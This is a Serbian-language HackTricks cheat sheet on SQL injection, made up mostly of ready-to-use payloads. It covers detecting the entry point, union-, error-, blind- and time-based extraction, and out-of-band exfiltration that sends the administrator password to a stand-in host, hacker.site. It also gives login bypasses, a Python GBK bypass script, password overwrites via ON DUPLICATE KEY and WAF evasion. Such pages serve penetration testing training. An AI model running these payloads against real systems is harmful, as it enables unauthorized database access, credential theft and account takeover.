# SQL Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/) je najrelevantnija sajber bezbednosna manifestacija u **Å paniji** i jedna od najvaÅ¾nijih u **Evropi**. Sa **misijom promovisanja tehniÄkog znanja**, ovaj kongres je vrelo okupljanje za profesionalce u tehnologiji i sajber bezbednosti u svakoj disciplini.

{% embed url="https://www.rootedcon.com/" %}

## Å ta je SQL injekcija?

**SQL injekcija** je sigurnosna greÅ¡ka koja omoguÄ‡ava napadaÄima da **ometaju upite baze podataka** aplikacije. Ova ranjivost moÅ¾e omoguÄ‡iti napadaÄima da **vide**, **modifikuju** ili **obriÅ¡u** podatke kojima ne bi trebali imati pristup, ukljuÄujuÄ‡i informacije drugih korisnika ili bilo koje podatke kojima aplikacija moÅ¾e pristupiti. Takve akcije mogu rezultirati trajnim promenama u funkcionalnosti ili sadrÅ¾aju aplikacije ili Äak kompromitovanjem servera ili uskraÄ‡ivanjem usluge.

## Detekcija ulazne taÄke

Kada se Äini da je sajt **ranjiv na SQL injekciju (SQLi)** zbog neobiÄnih odgovora servera na SQLi povezane ulaze, **prvi korak** je razumeti kako **ubaciti podatke u upit bez ometanja**. To zahteva identifikaciju metode za **efikasno izlazak iz trenutnog konteksta**. 
Ovo su neki korisni primeri:
```
[Nothing]
'
"
`
')
")
`)
'))
"))
`))
```
Zatim, treba da znate kako da **popravite upit tako da ne bude greÅ¡aka**. Da biste popravili upit, moÅ¾ete **uneti** podatke tako da **prethodni upit prihvati nove podatke**, ili moÅ¾ete jednostavno **uneti** svoje podatke i **dodati simbol komentara na kraju**.

_Napomena: ako moÅ¾ete da vidite poruke o greÅ¡ci ili primetite razlike kada upit radi i kada ne radi, ova faza Ä‡e biti lakÅ¡a._

### **Komentari**
```sql
MySQL
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

PostgreSQL
--comment
/*comment*/

MSQL
--comment
/*comment*/

Oracle
--comment

SQLite
--comment
/*comment*/

HQL
HQL does not support comments
```
### PotvrÄ‘ivanje logiÄkim operacijama

Pouzdana metoda za potvrÄ‘ivanje SQL injection ranjivosti ukljuÄuje izvrÅ¡avanje **logiÄke operacije** i posmatranje oÄekivanih rezultata. Na primer, GET parametar kao Å¡to je `?username=Peter` koji daje identiÄan sadrÅ¾aj kada se izmeni u `?username=Peter' or '1'='1` ukazuje na SQL injection ranjivost.

SliÄno tome, primena **matematiÄkih operacija** sluÅ¾i kao efikasna tehnika potvrÄ‘ivanja. Na primer, ako pristupanje `?id=1` i `?id=2-1` daje isti rezultat, to je pokazatelj SQL injection.

Primeri koji prikazuju potvrÄ‘ivanje logiÄke operacije:
```
page.asp?id=1 or 1=1 -- results in true
page.asp?id=1' or 1=1 -- results in true
page.asp?id=1" or 1=1 -- results in true
page.asp?id=1 and 1=2 -- results in false
```
Ova lista reÄi je kreirana da pokuÅ¡a da **potvrdi SQLinjections** na predloÅ¾eni naÄin:

{% file src="../../.gitbook/assets/sqli-logic.txt" %}

### PotvrÄ‘ivanje sa vremenom

U nekim sluÄajevima **neÄ‡ete primetiti nikakvu promenu** na stranici koju testirate. Stoga, dobar naÄin da **otkrijete slepe SQL injekcije** je da naterate DB da izvrÅ¡i radnje koje Ä‡e imati **uticaj na vreme** koje je potrebno stranici da se uÄita.\
Stoga, u SQL upitu Ä‡emo dodati operaciju koja Ä‡e potrajati dugo da se zavrÅ¡i:
```
MySQL (string concat and logical ops)
1' + sleep(10)
1' and sleep(10)
1' && sleep(10)
1' | sleep(10)

PostgreSQL (only support string concat)
1' || pg_sleep(10)

MSQL
1' WAITFOR DELAY '0:0:10'

Oracle
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)

SQLite
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```
U nekim sluÄajevima **funkcije spavanja neÄ‡e biti dozvoljene**. Tada, umesto koriÅ¡Ä‡enja tih funkcija, moÅ¾ete napraviti upit **koji izvodi sloÅ¾ene operacije** koje Ä‡e trajati nekoliko sekundi. _Primeri ovih tehnika biÄ‡e komentarisani posebno za svaku tehnologiju (ako ih ima)_.

### Identifikacija Back-end-a

Najbolji naÄin da identifikujete back-end je pokuÅ¡aj izvrÅ¡avanja funkcija razliÄitih back-end-ova. MoÅ¾ete koristiti _**sleep**_ **funkcije** iz prethodne sekcije ili ove (tabela iz [payloadsallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification):
```bash
["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
["connection_id()=connection_id()"                 ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
["@@CONNECTIONS>0"                                 ,"MSSQL"],
["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
["ROWNUM=ROWNUM"                                   ,"ORACLE"],
["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
["LNNVL(0=123)"                                    ,"ORACLE"],
["5::int=5"                                        ,"POSTGRESQL"],
["5::integer=5"                                    ,"POSTGRESQL"],
["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
["current_database()=current_database()"           ,"POSTGRESQL"],
["sqlite_version()=sqlite_version()"               ,"SQLITE"],
["last_insert_rowid()>1"                           ,"SQLITE"],
["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
["val(cvar(1))=1"                                  ,"MSACCESS"],
["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
```
TakoÄ‘e, ako imate pristup izlazu upita, mogli biste da **prikazujete verziju baze podataka**.

{% hint style="info" %}
U nastavku Ä‡emo razgovarati o razliÄitim metodama za iskoriÅ¡Ä‡avanje razliÄitih vrsta SQL Injection. KoristiÄ‡emo MySQL kao primer.
{% endhint %}

### Identifikacija sa PortSwigger

{% embed url="https://portswigger.net/web-security/sql-injection/cheat-sheet" %}

## IskoriÅ¡Ä‡avanje zasnovano na Uniji

### Otkrivanje broja kolona

Ako moÅ¾ete da vidite izlaz upita, ovo je najbolji naÄin da ga iskoristite.\
Prvo, treba da saznamo **broj** **kolona** koje **poÄetni zahtev** vraÄ‡a. To je zato Å¡to **oba upita moraju vraÄ‡ati isti broj kolona**.\
Dve metode se obiÄno koriste u tu svrhu:

#### Order/Group by

Da biste odredili broj kolona u upitu, postepeno prilagodite broj koriÅ¡Ä‡en u **ORDER BY** ili **GROUP BY** klauzulama dok ne dobijete laÅ¾an odgovor. I pored razliÄitih funkcionalnosti **GROUP BY** i **ORDER BY** unutar SQL-a, oboje se moÅ¾e koristiti identiÄno za utvrÄ‘ivanje broja kolona u upitu.
```sql
1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```

```sql
1' GROUP BY 1--+    #True
1' GROUP BY 2--+    #True
1' GROUP BY 3--+    #True
1' GROUP BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```
#### UNION SELECT

Izaberite sve viÅ¡e i viÅ¡e null vrednosti dok upit ne bude taÄan:
```sql
1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - Worked
```
_Trebalo bi da koristite `null` vrednosti jer u nekim sluÄajevima tip kolona sa obe strane upita mora biti isti i null je validan u svakom sluÄaju._

### Ekstraktovanje imena baza podataka, imena tabela i imena kolona

U sledeÄ‡im primerima Ä‡emo preuzeti ime svih baza podataka, ime tabele u bazi podataka, imena kolona tabele:
```sql
#Database names
-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata

#Tables of a database
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]

#Column names
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]
```
_Postoji razliÄit naÄin za otkrivanje ovih podataka na svakoj razliÄitoj bazi podataka, ali metodologija je uvek ista._

## Eksploatacija skrivenih unija

Kada je izlaz upita vidljiv, ali se Äini da unija zasnovana na injekciji nije moguÄ‡a, to oznaÄava prisustvo **skrivene unije zasnovane na injekciji**. Ova situacija Äesto dovodi do slepe injekcije. Da bi se slepa injekcija pretvorila u onu zasnovanu na uniji, potrebno je razjasniti izvrÅ¡ni upit na backendu.

To se moÅ¾e postiÄ‡i koriÅ¡Ä‡enjem tehnika slepe injekcije zajedno sa podrazumevanim tabelama specifiÄnim za vaÅ¡ ciljani sistem za upravljanje bazama podataka (DBMS). Za razumevanje ovih podrazumevanih tabela, savetuje se konsultacija sa dokumentacijom ciljanog DBMS-a.

Kada je upit izvuÄen, potrebno je prilagoditi svoj payload kako bi se sigurno zatvorio originalni upit. Nakon toga, unija upit se dodaje vaÅ¡em payload-u, olakÅ¡avajuÄ‡i eksploataciju novonastale unije zasnovane na injekciji.

Za sveobuhvatnije uvide, pogledajte ceo Älanak dostupan na [Healing Blind Injections](https://medium.com/@Rend_/healing-blind-injections-df30b9e0e06f).

## Eksploatacija zasnovana na greÅ¡ci

Ako iz nekog razloga **ne moÅ¾ete** da vidite **izlaz** **upita**, ali moÅ¾ete **videti poruke o greÅ¡ci**, moÅ¾ete iskoristiti ove poruke o greÅ¡ci da **izvucite** podatke iz baze podataka.\
PrateÄ‡i sliÄan tok kao u eksploataciji zasnovanoj na uniji, mogli biste uspeti da dump-ujete DB.
```sql
(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
```
## IskoriÅ¡Ä‡avanje Blind SQLi

U ovom sluÄaju ne moÅ¾ete videti rezultate upita ili greÅ¡ke, ali moÅ¾ete **razlikovati** kada upit **vraÄ‡a** **taÄan** ili **netaÄan** odgovor jer postoje razliÄiti sadrÅ¾aji na stranici.\
U ovom sluÄaju, moÅ¾ete iskoristiti to ponaÅ¡anje da izvuÄete bazu podataka karakter po karakter:
```sql
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'
```
## IskoriÅ¡Ä‡avanje Error Blind SQLi

Ovo je **isti sluÄaj kao pre** ali umesto da razlikujete izmeÄ‘u taÄnog/laÅ¾nog odgovora iz upita, moÅ¾ete **razlikovati izmeÄ‘u** **greÅ¡ke** u SQL upitu ili ne (moÅ¾da zato Å¡to HTTP server pada). Stoga, u ovom sluÄaju moÅ¾ete naterati SQL greÅ¡ku svaki put kada taÄno pogodite karakter:
```sql
AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- -
```
## IskoriÅ¡Ä‡avanje SQLi zasnovanog na vremenu

U ovom sluÄaju **nema** naÄina da se **razlikuje** **odgovor** upita na osnovu konteksta stranice. Ali, moÅ¾ete uÄiniti da stranica **duÅ¾e uÄitava** ako je pogodjeni karakter taÄan. VeÄ‡ smo videli ovu tehniku u upotrebi ranije kako bismo [potvrdili SQLi ranjivost](./#confirming-with-timing).
```sql
1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#
```
## Stacked Queries

MoÅ¾ete koristiti stacked queries da **izvrÅ¡ite viÅ¡e upita uzastopno**. Imajte na umu da, iako se uzastopni upiti izvrÅ¡avaju, **rezultati** se **ne vraÄ‡aju aplikaciji**. Stoga je ova tehnika prvenstveno korisna u vezi sa **blind vulnerabilities** gde moÅ¾ete koristiti drugi upit da pokrenete DNS upit, uslovnu greÅ¡ku ili vremensko kaÅ¡njenje.

**Oracle** ne podrÅ¾ava **stacked queries.** **MySQL, Microsoft** i **PostgreSQL** ih podrÅ¾avaju: `QUERY-1-HERE; QUERY-2-HERE`

## Out of band Exploitation

Ako **nijedna** metoda eksploatacije **nije uspela**, moÅ¾ete pokuÅ¡ati da naterate **bazu podataka da ex-filtrira** informacije na **spoljni host** koji kontroliÅ¡ete. Na primer, putem DNS upita:
```sql
select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
```
### Izvanbandna eksfiltracija podataka putem XXE
```sql
a' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.hacker.site/"> %remote;]>'),'/l') FROM dual-- -
```
## Automatizovana Eksploatacija

Proverite [SQLMap Cheatsheet](sqlmap/) da biste iskoristili SQLi ranjivost sa [**sqlmap**](https://github.com/sqlmapproject/sqlmap).

## TehniÄke specifiÄne informacije

VeÄ‡ smo razgovarali o svim naÄinima za eksploataciju SQL Injection ranjivosti. PronaÄ‘ite joÅ¡ nekoliko trikova zavisnih od tehnologije baze podataka u ovoj knjizi:

* [MS Access](ms-access-sql-injection.md)
* [MSSQL](mssql-injection.md)
* [MySQL](mysql-injection/)
* [Oracle](oracle-injection.md)
* [PostgreSQL](postgresql-injection/)

Ili Ä‡ete pronaÄ‡i **puno trikova vezanih za: MySQL, PostgreSQL, Oracle, MSSQL, SQLite i HQL u** [**https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection**](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/) je najrelevantnija sajber bezbednosna manifestacija u **Å paniji** i jedna od najvaÅ¾nijih u **Evropi**. Sa **misijom promovisanja tehniÄkog znanja**, ovaj kongres je vrelo mesto okupljanja za profesionalce u tehnologiji i sajber bezbednosti u svakoj disciplini.

{% embed url="https://www.rootedcon.com/" %}

## ZaobilaÅ¾enje autentifikacije

Lista za pokuÅ¡aj zaobilaÅ¾enja funkcionalnosti prijavljivanja:

{% content-ref url="../login-bypass/sql-login-bypass.md" %}
[sql-login-bypass.md](../login-bypass/sql-login-bypass.md)
{% endcontent-ref %}

### ZaobilaÅ¾enje autentifikacije sirovim heÅ¡om
```sql
"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
```
Ova upit prikazuje ranjivost kada se MD5 koristi sa true za sirovi izlaz u proverama autentifikacije, ÄineÄ‡i sistem podloÅ¾nim SQL injekciji. NapadaÄi mogu iskoristiti ovo kreiranjem ulaza koji, kada se hashiraju, proizvode neoÄekivane delove SQL komandi, Å¡to dovodi do neovlaÅ¡Ä‡enog pristupa.
```sql
md5("ffifdyop", true) = 'or'6ï¿½]ï¿½ï¿½!r,ï¿½ï¿½bï¿½
sha1("3fDf ", true) = Qï¿½u'='ï¿½@ï¿½[ï¿½tï¿½- oï¿½ï¿½_-!
```
### ZaobilaÅ¾enje autentifikacije pomoÄ‡u injektovanog heÅ¡a
```sql
admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
```
**PreporuÄena lista**:

Trebalo bi da koristite kao korisniÄko ime svaku liniju sa liste, a kao lozinku uvek: _**Pass1234.**_\
_(Ovi payload-ovi su takoÄ‘e ukljuÄeni u veliku listu pomenutu na poÄetku ovog odeljka)_

{% file src="../../.gitbook/assets/sqli-hashbypass.txt" %}

### GBK autentifikacija zaobilaÅ¾enje

AKO se ' escape-uje, moÅ¾ete koristiti %A8%27, a kada se ' escape-uje, biÄ‡e kreirano: 0xA80x5c0x27 (_â•˜'_)
```sql
%A8%27 OR 1=1;-- 2
%8C%A8%27 OR 1=1-- 2
%bf' or 1=1 -- --
```
Python skripta:
```python
import requests
url = "http://example.com/index.php"
cookies = dict(PHPSESSID='4j37giooed20ibi12f3dqjfbkp3')
datas = {"login": chr(0xbf) + chr(0x27) + "OR 1=1 #", "password":"test"}
r = requests.post(url, data = datas, cookies=cookies, headers={'referrer':url})
print r.text
```
### Polyglot injection (multicontext)
```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```
## Insert Statement

### Izmeni lozinku postojeÄ‡eg objekta/korisnika

Da biste to uradili, trebali biste pokuÅ¡ati da **napravite novi objekat nazvan kao "glavni objekat"** (verovatno **admin** u sluÄaju korisnika) modifikujuÄ‡i neÅ¡to:

* Napravite korisnika pod imenom: **AdMIn** (velika i mala slova)
* Napravite korisnika pod imenom: **admin=**
* **SQL Truncation Attack** (kada postoji neka vrsta **ograniÄenja duÅ¾ine** u korisniÄkom imenu ili e-mailu) --> Napravite korisnika sa imenom: **admin \[puno razmaka] a**

#### SQL Truncation Attack

Ako je baza podataka ranjiva i maksimalan broj karaktera za korisniÄko ime je, na primer, 30 i Å¾elite da se pretvarate da ste korisnik **admin**, pokuÅ¡ajte da kreirate korisniÄko ime pod nazivom: "_admin \[30 razmaka] a_" i bilo koju lozinku.

Baza podataka Ä‡e **proveriti** da li uneto **korisniÄko ime** **postoji** unutar baze podataka. Ako **ne**, **izreÅ¾e** Ä‡e **korisniÄko ime** na **maksimalan dozvoljeni broj karaktera** (u ovom sluÄaju na: "_admin \[25 razmaka]_") i automatski Ä‡e **ukloniti sve razmake na kraju aÅ¾urirajuÄ‡i** unutar baze podataka korisnika "**admin**" sa **novom lozinkom** (moÅ¾e se pojaviti neka greÅ¡ka, ali to ne znaÄi da ovo nije uspelo).

ViÅ¡e informacija: [https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html](https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html) & [https://resources.infosecinstitute.com/sql-truncation-attack/#gref](https://resources.infosecinstitute.com/sql-truncation-attack/#gref)

_Napomena: Ovaj napad viÅ¡e neÄ‡e raditi kao Å¡to je opisano iznad u najnovijim MySQL instalacijama. Dok poreÄ‘enja i dalje ignoriÅ¡u razmake na kraju po defaultu, pokuÅ¡aj umetanja stringa koji je duÅ¾i od duÅ¾ine polja rezultiraÄ‡e greÅ¡kom, a umetanje Ä‡e propasti. Za viÅ¡e informacija o ovoj provere: [https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation](https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation)_

### MySQL Insert time based checking

Dodajte koliko god `','',''` smatrate da je potrebno da izaÄ‘ete iz VALUES izjave. Ako se odgoda izvrÅ¡i, imate SQLInjection.
```sql
name=','');WAITFOR%20DELAY%20'0:0:5'--%20-
```
### ON DUPLICATE KEY UPDATE

Klauzula `ON DUPLICATE KEY UPDATE` u MySQL-u se koristi za odreÄ‘ivanje akcija koje baza podataka treba da preduzme kada se pokuÅ¡a umetanje reda koji bi rezultirao duplom vrednoÅ¡Ä‡u u UNIQUE indeksu ili PRIMARY KEY-u. SledeÄ‡i primer pokazuje kako se ova funkcija moÅ¾e iskoristiti za modifikaciju lozinke administratorskog naloga:

Example Payload Injection:

Injekcioni payload moÅ¾e biti kreiran na sledeÄ‡i naÄin, gde se pokuÅ¡ava umetanje dva reda u tabelu `users`. Prvi red je mamac, a drugi red cilja postojeÄ‡u email adresu administratora sa namerom da se aÅ¾urira lozinka:
```sql
INSERT INTO users (email, password) VALUES ("generic_user@example.com", "bcrypt_hash_of_newpassword"), ("admin_generic@example.com", "bcrypt_hash_of_newpassword") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_newpassword" -- ";
```
Evo kako to funkcioniÅ¡e:

- Upit pokuÅ¡ava da unese dva reda: jedan za `generic_user@example.com` i drugi za `admin_generic@example.com`.
- Ako red za `admin_generic@example.com` veÄ‡ postoji, `ON DUPLICATE KEY UPDATE` klauzula se aktivira, nareÄ‘ujuÄ‡i MySQL-u da aÅ¾urira polje `password` postojeÄ‡eg reda na "bcrypt_hash_of_newpassword".
- PoslediÄno, autentifikacija se moÅ¾e pokuÅ¡ati koristeÄ‡i `admin_generic@example.com` sa lozinkom koja odgovara bcrypt hash-u ("bcrypt_hash_of_newpassword" predstavlja bcrypt hash nove lozinke, koji treba zameniti stvarnim hash-om Å¾eljene lozinke).

### Ekstrakcija informacija

#### Kreiranje 2 naloga u isto vreme

Kada pokuÅ¡avate da kreirate novog korisnika, potrebni su korisniÄko ime, lozinka i email:
```
SQLi payload:
username=TEST&password=TEST&email=TEST'),('otherUsername','otherPassword',(select flag from flag limit 1))-- -

A new user with username=otherUsername, password=otherPassword, email:FLAG will be created
```
#### KoriÅ¡Ä‡enje decimalnog ili heksadecimalnog

Sa ovom tehnikom moÅ¾ete izvuÄ‡i informacije kreirajuÄ‡i samo 1 nalog. VaÅ¾no je napomenuti da ne morate komentarisati niÅ¡ta.

KoriÅ¡Ä‡enjem **hex2dec** i **substr**:
```sql
'+(select conv(hex(substr(table_name,1,6)),16,10) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
Da biste dobili tekst, moÅ¾ete koristiti:
```python
__import__('binascii').unhexlify(hex(215573607263)[2:])
```
KoristeÄ‡i **hex** i **replace** (i **substr**):
```sql
'+(select hex(replace(replace(replace(replace(replace(replace(table_name,"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

'+(select hex(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

#Full ascii uppercase and lowercase replace:
'+(select hex(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%"),"z","&"),"J","'"),"K","`"),"L","("),"M",")"),"N","@"),"O","$$"),"Z","&&")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/) je najrelevantnija sajber bezbednosna manifestacija u **Å paniji** i jedna od najvaÅ¾nijih u **Evropi**. Sa **misijom promovisanja tehniÄkog znanja**, ovaj kongres je vrelo okupljanje za profesionalce u tehnologiji i sajber bezbednosti u svakoj disciplini.

{% embed url="https://www.rootedcon.com/" %}

## Routed SQL injection

Routed SQL injection je situacija u kojoj upit koji se moÅ¾e injektovati nije onaj koji daje izlaz, veÄ‡ izlaz injektovanog upita ide u upit koji daje izlaz. ([From Paper](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Routed%20SQL%20Injection%20-%20Zenodermus%20Javanicus.txt))

Primer:
```
#Hex of: -1' union select login,password from users-- a
-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
```
## WAF Bypass

[PoÄetni bypass-ovi odavde](https://github.com/Ne3o1/PayLoadAllTheThings/blob/master/SQL%20injection/README.md#waf-bypass)

### Bypass bez razmaka

No Space (%20) - bypass koristeÄ‡i alternative za razmake
```sql
?id=1%09and%091=1%09--
?id=1%0Dand%0D1=1%0D--
?id=1%0Cand%0C1=1%0C--
?id=1%0Band%0B1=1%0B--
?id=1%0Aand%0A1=1%0A--
?id=1%A0and%A01=1%A0--
```
No Whitespace - zaobilaÅ¾enje koriÅ¡Ä‡enjem komentara
```sql
?id=1/*comment*/and/**/1=1/**/--
```
No Whitespace - zaobilaÅ¾enje koriÅ¡Ä‡enjem zagrada
```sql
?id=(1)and(1)=(1)--
```
### No commas bypass

No Comma - zaobilaÅ¾enje koriÅ¡Ä‡enjem OFFSET, FROM i JOIN
```
LIMIT 0,1         -> LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```
### Generic Bypasses

Crna lista koristeÄ‡i kljuÄne reÄi - zaobiÄ‡i koristeÄ‡i velika/mala slova
```sql
?id=1 AND 1=1#
?id=1 AnD 1=1#
?id=1 aNd 1=1#
```
Blacklist koristeÄ‡i kljuÄne reÄi bez obzira na velika i mala slova - zaobiÄ‡i koristeÄ‡i ekvivalentni operator
```
AND   -> && -> %26%26
OR    -> || -> %7C%7C
=     -> LIKE,REGEXP,RLIKE, not < and not >
> X   -> not between 0 and X
WHERE -> HAVING --> LIMIT X,1 -> group_concat(CASE(table_schema)When(database())Then(table_name)END) -> group_concat(if(table_schema=database(),table_name,null))
```
### Bypass WAF pomoÄ‡u nauÄne notacije

MoÅ¾ete pronaÄ‡i detaljnije objaÅ¡njenje ovog trika na [gosecure blogu](https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/).\
U suÅ¡tini, moÅ¾ete koristiti nauÄnu notaciju na neoÄekivane naÄine kako biste zaobiÅ¡li WAF:
```
-1' or 1.e(1) or '1'='1
-1' or 1337.1337e1 or '1'='1
' or 1.e('')=
```
### Bypass Column Names Restriction

Prvo, primetite da ako **originalni upit i tabela iz koje Å¾elite da izvuÄete zastavicu imaju isti broj kolona** moÅ¾ete jednostavno uraditi: `0 UNION SELECT * FROM flag`

MoguÄ‡e je **pristupiti treÄ‡oj koloni tabele bez koriÅ¡Ä‡enja njenog imena** koristeÄ‡i upit poput sledeÄ‡eg: `SELECT F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;`, tako da bi u sqlinjection ovo izgledalo ovako:
```bash
# This is an example with 3 columns that will extract the column number 3
-1 UNION SELECT 0, 0, 0, F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;
```
Ili koriÅ¡Ä‡enjem **comma bypass**:
```bash
# In this case, it's extracting the third value from a 4 values table and returning 3 values in the "union select"
-1 union select * from (select 1)a join (select 2)b join (select F.3 from (select * from (select 1)q join (select 2)w join (select 3)e join (select 4)r union select * from flag limit 1 offset 5)F)c
```
Ova trik je preuzet sa [https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/](https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/)

### WAF bypass suggester tools

{% embed url="https://github.com/m4ll0k/Atlas" %}

## Ostali vodiÄi

* [https://sqlwiki.netspi.com/](https://sqlwiki.netspi.com)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

## Lista za detekciju Brute-Force

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/sqli.txt" %}



â€‹

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

